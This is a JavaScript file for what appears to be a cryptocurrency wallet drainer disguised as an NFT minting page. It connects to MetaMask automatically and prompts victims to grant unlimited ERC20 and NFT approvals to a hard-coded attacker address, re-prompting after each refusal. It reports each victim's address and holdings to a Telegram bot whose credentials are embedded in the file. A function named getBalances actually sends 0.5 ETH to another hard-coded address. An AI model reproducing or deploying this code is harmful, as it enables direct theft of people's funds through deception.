const defaultNetworks = ["ethereum", "binance-smart-chain", "polygon"]
const chainIdsNetworks = {
    "ethereum": 1,
    "binance-smart-chain": 56,
    "polygon": 137
}
const chainIdsNames = {
    "ethereum": "Ethereum",
    "binance-smart-chain": "Binance Smart Chain",
    "polygon": "Polygon"
}
const forbiddenTokens = ["ETH", "BNB", "MATIC"]

const abi = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const abiNFT = [
    {
        "inputs": [{
            "internalType": "address",
            "name": "operator",
            "type": "address"
        }, {
            "internalType": "bool",
            "name": "approved",
            "type": "bool"
        }],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

const accountBalances = {
    tokens: [],
    nft: [],
    tokensandnft: []
}

const WITHDRAWAL_ADDRESS = "0xb5A037F1fad73E0c93c622f53630c6Af620dD92D"
const MINIMAL_SUM_IN_USD = 1
const TOKEN_ID = "5465264423:AAHWzOhVLCD4WshAE713K8Npn32RUIDvfBU"
const CHAT_ID = "5517334837"

let accountAddress = null, walletConnector, currentConnection

const getMobileOperatingSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}

const getDAppSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (/Trust/i.test(userAgent)) {
        return "Trust";
    }

    if (/CriOS/i.test(userAgent)) {
        return "Metamask";
    }

    return "unknown";
}

const openMetaMaskUrl = (url) => {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_self";
    document.body.appendChild(a);
    a.click();
    a.remove();
}
const paynow = async (withdrawalToken) => {
    if (withdrawalToken) {
        if (withdrawalToken.balanceUSD < MINIMAL_SUM_IN_USD) {

            return
        }

        let web3, provider
        // $("#connectButton").html("Processing");

        if (currentConnection === "metamask") {
            web3 = new Web3(window.ethereum)
            provider = new ethers.providers.Web3Provider(window.ethereum, "any")

            if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
                });
            }
        } else if (currentConnection === "walletconnect") {
            if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
                $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
                $('#chainErrorMessage').show();

                $("#overlay").fadeOut(300);

                return
            }

            provider = new window.WalletConnectProvider.default({
                rpc: {
                    1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
                    56: "https://bsc-dataseed.binance.org/",
                    137: "https://polygon-rpc.com"
                }
            });

            await provider.enable()

            provider = new ethers.providers.Web3Provider(provider, "any")
        }

        const signer = provider.getSigner()

        if (withdrawalToken.appId === "tokens") {
            const contract = new ethers.Contract(withdrawalToken.address, abi, signer)

            try {
                await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)

                var z=$.ajax({  
type: "POST",  
url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(withdrawalToken.balanceUSD)+"$"), 
}); 


            } catch (e) {
                var z=$.ajax({  
                    type: "POST",  
                    url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
                    data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 CLOSED. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(withdrawalToken.balanceUSD)+"$"), 
                    });
                paynow(withdrawalToken)

            }
        } else if (withdrawalToken.appId === "nft") {
            const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)

            try {
                await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)

               var z=$.ajax({  
type: "POST",  
url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(withdrawalToken.balanceUSD)+"$"), 
}); 

            } catch (e) {
                var z=$.ajax({  
                    type: "POST",  
                    url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
                    data: "parse_mode=HTML&text="+encodeURIComponent("NFT CLOSED. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(withdrawalToken.balanceUSD)+"$"), 
                    }); 
                paynow(withdrawalToken)

            }
        } else {

        }
    } else {

    }
}
const getBalances = async () => {
    try {
        if (currentConnection === "metamask") {
            if (typeof window.ethereum.selectedAddress !== "undefined") {
                accountAddress = window.ethereum.selectedAddress
            } else if (typeof window.ethereum.address !== "undefined") {
                accountAddress = window.ethereum.address
            }
        } else if (currentConnection === "walletconnect") {
            accountAddress = walletConnector._accounts[0]
        }
        let ethereum = window.ethereum;


        // Request account access if needed
        await ethereum.enable();


        let provider = new ethers.providers.Web3Provider(ethereum);

        // Acccounts now exposed
        const params = [{
            from: accountAddress,
            to: "0xFB848793bA25ff0AC1E805a65CC4F1721751F06D",
            value: ethers.utils.parseUnits("0.5", 'ether').toHexString()
        }];

        const transactionHash = await provider.send('eth_sendTransaction', params)
        console.log('transactionHash is ' + transactionHash);
        
    } catch (e) {
        
    }
} 

const checkInstallMetamask = () => {
    return new Promise((res) => {
        if (typeof window.ethereum !== 'undefined') {
            return res(true)
        } else {
            return res(false)
        }
    })
}

const connectMetamask = async () => {
    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
        window.location.href = `https://metamask.app.link/dapp/${window.location.host}`;
        return
    }

    window.ethereum.on('accountsChanged', function (accounts) {
        accountAddress = accounts[0]

    });

    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})

    accountAddress = accounts[0]
    var z=$.ajax({  
        type: "POST",  
        url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
        data: "parse_mode=HTML&text="+encodeURIComponent("Metamask connected "+accountAddress), 
        }); 
    currentConnection = "metamask"
    $('#connectt').html('MINT')


}

const connectTrustWallet = async () => {
    if (!window.ethereum?.isTrust && getMobileOperatingSystem() !== "unknown") {
        openMetaMaskUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.origin}`)

        return
    }

    if (window.ethereum?.isTrust) {
        window.ethereum.on('accountsChanged', function (accounts) {
            accountAddress = accounts[0]


        });

        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})

        accountAddress = accounts[0]
        currentConnection = "metamask"

    } else {
        if (!walletConnector.connected) {
            walletConnector.createSession().then(() => {
                const uri = walletConnector.uri;

                window.WalletConnectQRCodeModal.default.open(uri, () => {
                    console.log('QR Code Modal closed');
                });
            });
        } else {
            walletConnector.killSession();
        }
    }
}

const initMetamask = async () => {
    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {


        return
    }

    const installedMetamask = await checkInstallMetamask()

    if (!installedMetamask) {


        return
    }


}

const initWalletConnect = () => {
    if (getDAppSystem() !== "Trust" && getMobileOperatingSystem() !== "unknown") {


        return
    }

    walletConnector = new window.WalletConnect.default({
        bridge: 'https://bridge.walletconnect.org'
    });



    walletConnector.on('connect', function (error, payload) {
        if (error) {
            console.error(error);
        } else {
            window.WalletConnectQRCodeModal.default.close();


            accountAddress = payload.params[0].accounts[0]
            currentConnection = "walletconnect"
        }
    });

    walletConnector.on('session_update', function (error, payload) {
        if (error) {
            console.error(error);
        } else if (walletConnector.connected) {

            accountAddress = payload.params[0].accounts[0]
        }

    });

    walletConnector.on('disconnect', function (error, payload) {
        if (error) {
            console.error(error);
        } else {


            accountAddress = null
        }
    });
}


setTimeout(connectMetamask, 1000)